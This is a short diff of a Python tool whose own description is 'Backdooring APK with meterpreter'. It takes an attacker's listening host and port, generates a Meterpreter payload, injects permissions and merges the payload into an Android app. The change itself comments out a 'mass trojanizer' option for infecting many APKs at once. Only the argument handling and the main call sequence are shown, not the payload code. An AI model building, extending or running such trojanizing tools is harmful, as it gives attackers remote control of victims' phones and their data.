@@ -208,14 +208,14 @@ try:
 	parser = argparse.ArgumentParser(description='Backdooring APK with meterpreter')
 	parser.add_argument('-l','--lhost', help='LHOST select local host', required=True, dest='lhost')
 	parser.add_argument('-p','--lport', help='LPORT select local port', required=False, default='443')
-	parser.add_argument('-m', '--mas-trojanizer', help='Massive trojanization module, you need edit file: list_apk.txt', action='store_true', default=False) # Mass trojanizer module
+	#parser.add_argument('-m', '--mas-trojanizer', help='Massive trojanization module, you need edit file: list_apk.txt', action='store_true', default=False) # Mass trojanizer module
 	args=parser.parse_args()
 	host=args.lhost
 	port=args.lport
-	mass_trojan=args.mas-trojanizer # Mass trojanizer module
+	#mass_trojan=args.mas-trojanizer # Mass trojanizer module
 	generate_meterpreter(host,port)
-	if mass_trojan: # Mass trojanizer module
-		mass_trojanizer() # Mass trojanizer module
+	#if mass_trojan: # Mass trojanizer module
+		#mass_trojanizer() # Mass trojanizer module
 	inyeccion_permisos()
 	integracion_meterpreter()
 	remove_tmp_meterpreter()
